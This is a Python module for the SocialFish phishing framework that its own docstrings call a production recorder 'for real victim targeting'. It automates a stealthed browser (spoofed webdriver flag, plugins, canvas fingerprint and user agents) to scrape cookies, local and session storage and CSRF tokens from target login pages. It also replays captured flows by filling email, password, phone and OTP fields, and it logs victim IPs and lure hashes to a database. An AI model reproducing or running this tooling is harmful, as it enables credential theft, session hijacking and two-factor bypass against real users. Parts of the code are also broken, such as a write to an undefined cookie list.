#!/usr/bin/env python3
"""
Selenium Integration for SocialFish v3.0 - Production Build
Real browser automation, advanced stealth, full cookie scraping, attack capabilities
"""

import os
import json
import time
import random
import string
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from pathlib import Path
import sqlite3
import logging

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException
    from webdriver_manager.chrome import ChromeDriverManager
    from webdriver_manager.firefox import GeckoDriverManager
except ImportError:
    print("[-] Selenium not installed. Run: pip install selenium webdriver-manager")
    exit(1)

logger = logging.getLogger('selenium_recorder')

class SeleniumRecorder:
    """Production Selenium recorder for real victim targeting"""
    
    def __init__(self, database_path="./database.db", browser='chrome', headless=True, stealth=True):
        self.db_path = database_path
        self.browser_type = browser
        self.headless = headless
        self.stealth = stealth
        self.driver = None
        self.session_id = None
        self.session_data = {
            'all_cookies': [],
            'persistent_cookies': [],
            'localStorage': {},
            'sessionStorage': {},
            'csrf_tokens': {},
            'form_fields': [],
            'network_logs': [],
            'screenshots': [],
            'actions': [],
            'submission_detected': False,
            'submission_url': None,
            'submission_data': None
        }
    
    def _get_chrome_options(self):
        """Configure Chrome with advanced stealth & anti-detection"""
        options = ChromeOptions()
        
        if self.headless:
            options.add_argument('--headless=new')
        
        # Anti-detection
        if self.stealth:
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--no-sandbox')
            
            # Randomize viewport
            viewports = [
                (1920, 1080), (1366, 768), (1440, 900), (1680, 1050), (1280, 720)
            ]
            width, height = random.choice(viewports)
            options.add_argument(f'--window-size={width},{height}')
            
            # Random user agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
            ]
            options.add_argument(f'user-agent={random.choice(user_agents)}')
            
            # Disable GPU
            options.add_argument('--disable-gpu')
            options.add_argument('--disable-features=TranslateUI')
            options.add_argument('--excludeSwitches', ['enable-automation'])
            options.add_argument('--disable-web-resources')
        
        return options
    
    def _inject_stealth_js(self):
        """Inject JavaScript to evade detection"""
        if not self.driver:
            return
        
        stealth_scripts = [
            # Hide webdriver
            """
            Object.defineProperty(navigator, 'webdriver', {
                get: () => false,
            });
            """,
            # spoof chrome
            """
            window.chrome = {
                runtime: {}
            };
            """,
            # Mock plugins
            """
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            """,
            # Random canvas fingerprint
            """
            const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function () {
                if (this.id === 'canvas') {
                    return "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...";
                }
                return originalToDataURL.call(this);
            };
            """
        ]
        
        for script in stealth_scripts:
            try:
                self.driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                    "source": script
                })
            except:
                pass
    
    def _get_firefox_options(self):
        """Configure Firefox options"""
        options = FirefoxOptions()
        
        if self.headless:
            options.add_argument('--headless')
        
        if self.stealth:
            options.add_argument('--private')
        
        return options
    
    def init_driver(self):
        """Initialize Selenium WebDriver with stealth"""
        try:
            if self.browser_type == 'chrome':
                options = self._get_chrome_options()
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=options)
            elif self.browser_type == 'firefox':
                options = FirefoxOptions()
                if self.headless:
                    options.add_argument('--headless')
                self.driver = webdriver.Firefox(service=Service(GeckoDriverManager().install()), options=options)
            else:
                raise ValueError(f"Unsupported browser: {self.browser_type}")
            
            # Inject stealth code
            self._inject_stealth_js()
            
            # Set implicit wait
            self.driver.implicitly_wait(10)
            
            print(f"[+] Selenium WebDriver initialized ({self.browser_type})")
            return True
        except Exception as e:
            print(f"[-] Failed to initialize driver: {e}")
            return False
    
    def record_flow(self, url: str, wait_time=300):
        """Record real victim login flow"""
        if not self.driver:
            if not self.init_driver():
                return None
        
        import hashlib
        self.session_id = hashlib.sha256(f"{url}{datetime.now().isoformat()}".encode()).hexdigest()[:16]
        
        print(f"[*] Recording session: {self.session_id}")
        print(f"[*] Target: {url}")
        
        try:
            self.driver.get(url)
            self._take_screenshot('initial')
            
            # Detect all forms and cookies before interaction
            self._detect_all_forms()
            self._scrape_all_cookies()
            
            print(f"[*] Waiting {wait_time}s for victim interaction...")
            self._wait_and_monitor(wait_time)
            
            # Capture final state after submission
            self._scrape_all_cookies()
            self._take_screenshot('final')
            
            print(f"[+] Recording complete")
            return self.session_id
        
        except Exception as e:
            print(f"[-] Recording error: {e}")
            return None
    
    def _scrape_all_cookies(self):
        """Scrape ALL cookies (browser + JavaScript)"""
        try:
            # Browser cookies
            browser_cookies = self.driver.get_cookies()
            
            for cookie in browser_cookies:
                cookie_obj = {
                    'name': cookie.get('name'),
                    'value': cookie.get('value'),
                    'domain': cookie.get('domain'),
                    'path': cookie.get('path'),
                    'secure': cookie.get('secure'),
                    'httponly': cookie.get('httpOnly'),
                    'samesite': cookie.get('sameSite'),
                    'expiry': cookie.get('expiry'),
                    'captured_at': datetime.now().isoformat(),
                    'source': 'browser'
                }
                self.session_data['all_cookies'].append(cookie_obj)
                
                # Track persistent vs session
                if cookie.get('expiry'):
                    self.session_data['persistent_cookies'].append(cookie_obj)
            
            # JavaScript-accessible cookies
            try:
                js_cookies = self.driver.execute_script("""
                    return document.cookie.split(';').map(c => ({
                        name: c.split('=')[0].trim(),
                        value: c.split('=')[1]?.trim() || '',
                        source: 'js'
                    }));
                """)
                self.session_data['all_cookies'].extend(js_cookies)
            except:
                pass
            
            # localStorage
            try:
                local_storage = self.driver.execute_script("""
                    let storage = {};
                    for (let i = 0; i < window.localStorage.length; i++) {
                        let key = window.localStorage.key(i);
                        storage[key] = window.localStorage.getItem(key);
                    }
                    return storage;
                """)
                self.session_data['localStorage'] = local_storage
            except:
                pass
            
            # sessionStorage
            try:
                session_storage = self.driver.execute_script("""
                    let storage = {};
                    for (let i = 0; i < window.sessionStorage.length; i++) {
                        let key = window.sessionStorage.key(i);
                        storage[key] = window.sessionStorage.getItem(key);
                    }
                    return storage;
                """)
                self.session_data['sessionStorage'] = session_storage
            except:
                pass
            
            print(f"[+] Scraped {len(self.session_data['all_cookies'])} total cookies")
            
        except Exception as e:
            print(f"[-] Cookie scraping error: {e}")
    
    def _detect_all_forms(self):
        """Detect ALL forms and CSRF tokens"""
        try:
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            
            for i, form in enumerate(forms):
                form_data = {
                    'index': i,
                    'action': form.get_attribute('action'),
                    'method': form.get_attribute('method') or 'POST',
                    'id': form.get_attribute('id'),
                    'name': form.get_attribute('name'),
                    'fields': [],
                    'csrf_tokens': []
                }
                
                # Find all inputs, textareas, selects
                for input_elem in form.find_elements(By.TAG_NAME, 'input'):
                    field = {
                        'type': input_elem.get_attribute('type'),
                        'name': input_elem.get_attribute('name'),
                        'id': input_elem.get_attribute('id'),
                        'placeholder': input_elem.get_attribute('placeholder'),
                        'value': input_elem.get_attribute('value')
                    }
                    form_data['fields'].append(field)
                    
                    # Detect CSRF tokens
                    name_lower = (field.get('name') or '').lower()
                    if any(x in name_lower for x in ['csrf', 'token', 'nonce', '_token', 'xsrf']):
                        form_data['csrf_tokens'].append(field)
                        self.session_data['csrf_tokens'][field['name']] = field['id']
                
                self.session_data['form_fields'].append(form_data)
            
            print(f"[+] Detected {len(self.session_data['form_fields'])} form(s)")
            
        except Exception as e:
            print(f"[-] Form detection error: {e}")
    
    def _wait_and_monitor(self, timeout: int):
        """Wait and monitor for submission"""
        start_time = time.time()
        last_url = self.driver.current_url
        
        while time.time() - start_time < timeout:
            try:
                current_url = self.driver.current_url
                
                # Detect navigation
                if current_url != last_url:
                    print(f"[+] Navigation detected: {current_url}")
                    self.session_data['submission_detected'] = True
                    self.session_data['submission_url'] = current_url
                    self._take_screenshot('post_submission')
                    break
                
                time.sleep(2)
            except:
                break
    
    def _capture_cookies(self):
        """Capture all browser cookies"""
        try:
            cookies = self.driver.get_cookies()
            for cookie in cookies:
                self.session_data['cookies'].append({
                    'name': cookie.get('name'),
                    'value': cookie.get('value'),
                    'domain': cookie.get('domain'),
                    'path': cookie.get('path'),
                    'secure': cookie.get('secure'),
                    'httponly': cookie.get('httpOnly'),
                    'expiry': cookie.get('expiry'),
                    'captured_at': datetime.now().isoformat()
                })
            
            print(f"[+] Captured {len(cookies)} cookies")
        except Exception as e:
            print(f"[-] Cookie capture error: {e}")
    
    def _take_screenshot(self, label: str = 'screenshot'):
        """Take screenshot with label"""
        try:
            screenshots_dir = Path('templates/screenshots/selenium')
            screenshots_dir.mkdir(parents=True, exist_ok=True)
            
            filename = screenshots_dir / f"{label}_{datetime.now().strftime('%H%M%S')}.png"
            self.driver.save_screenshot(str(filename))
            self.session_data['screenshots'].append(str(filename))
            print(f"[+] Screenshot saved: {label}")
        except Exception as e:
            print(f"[-] Screenshot error: {e}")
    
    def _capture_state(self):
        """Capture current browser state"""
        try:
            self._scrape_all_cookies()
            self._detect_all_forms()
            self.session_data['current_url'] = self.driver.current_url
            self.session_data['page_title'] = self.driver.title
        except Exception as e:
            print(f"[-] State capture error: {e}")
    
    def replay_flow(self, template_data: Dict, submit_data: Dict = None):
        """Replay a recorded flow with new credentials"""
        if not self.driver:
            if not self.init_driver():
                return None
        
        try:
            # Navigate to base URL
            base_url = template_data.get('base_url')
            self.driver.get(base_url)
            self._take_screenshot('replay_start')
            
            # Fill forms if data provided
            if submit_data:
                forms = self.driver.find_elements(By.TAG_NAME, 'form')
                if forms:
                    self._fill_and_submit_form(forms[0], submit_data)
                    
                    # Wait for response
                    time.sleep(3)
                    self._scrape_all_cookies()
            
            # Capture final state
            self._capture_state()
            self._take_screenshot('replay_end')
            
            return self.session_data
        
        except Exception as e:
            print(f"[-] Replay error: {e}")
            return None
    
    def replay_template(self, template_id: str, new_credentials: dict):
        """Replay captured flow with new credentials"""
        if not self.driver:
            if not self.init_driver():
                return False
        
        try:
            # Load template from DB
            conn = sqlite3.connect(self.db_path or '/tmp/socialfish.db')
            cursor = conn.cursor()
            cursor.execute("SELECT url, form_data FROM templates WHERE id = ?", (template_id,))
            template = cursor.fetchone()
            conn.close()
            
            if not template:
                print(f"[-] Template not found: {template_id}")
                return False
            
            url, form_data = template
            
            print(f"[*] Replaying template: {template_id}")
            self.driver.get(url)
            self._take_screenshot('replay_start')
            
            # Fill and submit forms
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            for form in forms:
                self._fill_and_submit_form(form, new_credentials)
            
            # Wait for submission result
            time.sleep(5)
            self._scrape_all_cookies()
            self._take_screenshot('replay_end')
            
            print(f"[+] Replay completed")
            return True
        
        except Exception as e:
            print(f"[-] Replay error: {e}")
            return False
    
    def _fill_and_submit_form(self, form, credentials: dict):
        """Intelligently fill and submit form"""
        try:
            inputs = form.find_elements(By.TAG_NAME, 'input')
            
            for input_elem in inputs:
                field_type = (input_elem.get_attribute('type') or 'text').lower()
                field_name = (input_elem.get_attribute('name') or '').lower()
                field_id = (input_elem.get_attribute('id') or '').lower()
                field_placeholder = (input_elem.get_attribute('placeholder') or '').lower()
                
                # Combine all attributes to search
                field_attrs = f"{field_name} {field_id} {field_placeholder}"
                
                # Determine field type and fill
                if field_type in ['hidden', 'submit', 'button']:
                    continue
                
                elif any(x in field_attrs for x in ['email', 'user', 'login', 'account']):
                    if 'email' in credentials:
                        self._fill_field(input_elem, credentials['email'])
                
                elif any(x in field_attrs for x in ['pass', 'pwd', 'password']):
                    if 'password' in credentials:
                        self._fill_field(input_elem, credentials['password'])
                
                elif any(x in field_attrs for x in ['phone', 'mobile']):
                    if 'phone' in credentials:
                        self._fill_field(input_elem, credentials['phone'])
                
                elif any(x in field_attrs for x in ['code', 'otp', 'verify', '2fa']):
                    if 'otp' in credentials:
                        self._fill_field(input_elem, credentials['otp'])
                
                elif field_type == 'text':
                    if 'username' in credentials:
                        self._fill_field(input_elem, credentials['username'])
            
            # Submit form
            try:
                submit = form.find_element(By.XPATH, ".//button[@type='submit'] | .//input[@type='submit']")
                submit.click()
                print(f"[+] Form submitted")
            except:
                print(f"[-] No submit button found")
        
        except Exception as e:
            print(f"[-] Form fill error: {e}")
    
    def _fill_field(self, element, value: str):
        """Fill form field with value"""
        try:
            element.click()
            time.sleep(0.5)
            element.clear()
            element.send_keys(value)
            print(f"[+] Filled field: {element.get_attribute('name')}")
        except Exception as e:
            print(f"[-] Field fill error: {e}")
    def close(self):
        """Close the driver"""
        if self.driver:
            self.driver.quit()
            print("[+] Selenium WebDriver closed")
    
    def save_session_to_db(self, lure_hash: str, victim_ip: str, user_agent: str):
        """Save session to database"""
        try:
            conn = sqlite3.connect(self.db_path or '/tmp/socialfish.db')
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO sessions (
                    session_id, lure_hash, victim_ip, user_agent, 
                    all_cookies, localStorage, sessionStorage, csrf_tokens,
                    form_data, submission_detected, submission_url
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                self.session_id,
                lure_hash,
                victim_ip,
                user_agent,
                json.dumps(self.session_data['all_cookies']),
                json.dumps(self.session_data['localStorage']),
                json.dumps(self.session_data['sessionStorage']),
                json.dumps(self.session_data['csrf_tokens']),
                json.dumps(self.session_data['form_fields']),
                self.session_data.get('submission_detected', False),
                self.session_data.get('submission_url', '')
            ))
            
            conn.commit()
            conn.close()
            
            print(f"[+] Session saved to database: {self.session_id}")
            return self.session_id
        except Exception as e:
            print(f"[-] Database save error: {e}")
            return None
    
    def export_session(self, filename: str = None) -> str:
        """Export session to JSON"""
        if not filename:
            filename = f"selenium_session_{self.session_id or datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.session_data, f, indent=2)
        
        print(f"[+] Session exported: {filename}")
        return filename

def main():
    """CLI test"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Selenium Recorder')
    subparsers = parser.add_subparsers(dest='command')
    
    record_parser = subparsers.add_parser('record', help='Record login flow')
    record_parser.add_argument('url', help='Target URL')
    record_parser.add_argument('--browser', choices=['chrome', 'firefox'], default='chrome')
    record_parser.add_argument('--headless', action='store_true', default=True)
    
    args = parser.parse_args()
    
    if args.command == 'record':
        recorder = SeleniumRecorder(browser=args.browser, headless=args.headless)
        recorder.init_driver()
        result = recorder.record_flow(args.url)
        if result:
            recorder.export_session()
        recorder.close()

if __name__ == '__main__':
    main()
